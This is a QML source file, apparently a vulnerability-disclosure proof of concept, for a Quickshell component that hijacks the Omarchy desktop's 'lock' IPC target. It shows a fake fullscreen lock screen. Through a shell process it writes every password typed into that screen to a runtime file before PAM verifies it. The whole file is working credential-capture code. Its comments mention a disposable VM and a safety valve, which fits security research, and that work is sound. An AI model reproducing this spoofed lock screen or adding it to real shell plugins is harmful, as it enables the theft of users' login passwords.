import QtQuick
import Quickshell
import Quickshell.Io
import Quickshell.Services.Pam
import Quickshell.Wayland

// FINDING 1 PoC v4 — credential-capture overlay.
//
// The takeover is the same: the manifest self-declares clonedFrom, the shell
// evicts the genuine lock and routes the "lock" IPC target here. When
// omarchy-system-lock fires, THIS QML renders a fullscreen capture UI in
// place of the genuine lock screen. Built from the same primitives the
// genuine lock's own preview window uses (PanelWindow + WlrLayershell
// Overlay + exclusive keyboard focus) so it is stable under software
// rendering; the session-lock protocol surface is deliberately not engaged
// by the replica (v3 showed it works but crashes Quickshell 6.11.2 on
// teardown — that live observation is in the report).

Item {
  id: root

  property var shell: null
  property string omarchyPath: ""
  property bool captureUiVisible: false
  property string enteredPassword: ""
  property string pendingPassword: ""
  property bool authenticating: false
  property int failedAttempts: 0

  // ═══ FINDING 1 POC CAPTURE HOOK — the demonstration ═══
  // Appends every submitted password to a user-private runtime file,
  // before PAM verifies it. Unlock behaves normally afterwards.
  property Process pocCapture: Process {
    stdinEnabled: true
    running: true
    command: ["sh", "-c", "while IFS= read -r line; do printf '%s\\n' \"$line\" >> \"${XDG_RUNTIME_DIR:-/tmp}/omarchy-poc-captured-password\"; done"]
  }

  PamContext {
    id: passwordPam
    config: "omarchy-lock-password"
    user: Quickshell.env("USER") || Quickshell.env("LOGNAME")

    onResponseRequiredChanged: root.respond()
    onPamMessage: root.respond()
    onCompleted: function(result) {
      root.authenticating = false
      if (result === PamResult.Success) {
        root.captureUiVisible = false
        root.resetState()
      } else {
        root.failedAttempts += 1
        root.enteredPassword = ""
        // Safety valve so the disposable VM session can never be wedged:
        if (root.failedAttempts >= 3) {
          root.captureUiVisible = false
          root.resetState()
        }
      }
    }
  }

  function respond() {
    if (passwordPam.responseRequired) passwordPam.respond(root.pendingPassword)
  }

  function resetState() {
    root.enteredPassword = ""
    root.pendingPassword = ""
    root.authenticating = false
  }

  function submitPassword(value) {
    var password = String(value || "")
    if (!root.captureUiVisible || root.authenticating || password.length === 0) return

    // ═══ FINDING 1 POC CAPTURE HOOK ═══
    console.warn("PWN-PROOF [capture]: lock password received by third-party acme.lock")
    pocCapture.write(password + "\n")

    root.pendingPassword = password
    root.authenticating = true
    if (!passwordPam.start()) {
      root.authenticating = false
      root.failedAttempts += 1
    }
  }

  // Same fullscreen-overlay pattern as the genuine lock's own preview
  // window (Service.qml:498-504): Overlay layer, exclusive keyboard focus.
  PanelWindow {
    id: captureWindow
    visible: root.captureUiVisible
    anchors { top: true; bottom: true; left: true; right: true }
    color: "#0d0d12"
    WlrLayershell.namespace: "omarchy-lock-preview"
    WlrLayershell.layer: WlrLayer.Overlay
    WlrLayershell.keyboardFocus: WlrKeyboardFocus.Exclusive
    exclusionMode: ExclusionMode.Ignore

    TextInput {
      id: passwordField
      anchors.centerIn: parent
      width: parent.width * 0.4
      font.pixelSize: 18
      color: "#ffffff"
      echoMode: TextInput.Password
      focus: true
      enabled: !root.authenticating
      text: root.enteredPassword
      onTextEdited: root.enteredPassword = text
      onAccepted: root.submitPassword(root.enteredPassword)

      Text {
        anchors.fill: parent
        visible: root.enteredPassword === ""
        text: root.failedAttempts >= 1
              ? "wrong password — try again (3 failures dismiss)"
              : "POC LOCK (acme.lock) — type the VM password + Enter"
        color: root.failedAttempts >= 1 ? "#e06c60" : "#9a9aa8"
        font.pixelSize: 14
        verticalAlignment: Text.AlignVCenter
      }
    }
  }

  // The first-party lock registers this same target (Service.qml:510 via its
  // ShellIpc wrapper). The clonedFrom eviction means this is the handler
  // that receives omarchy-system-lock.
  IpcHandler {
    target: "lock"

    function lock(): string {
      root.resetState()
      root.failedAttempts = 0
      root.captureUiVisible = true
      return "ok"
    }

    function isLocked(): string {
      return root.captureUiVisible ? "true" : "false"
    }
  }
}
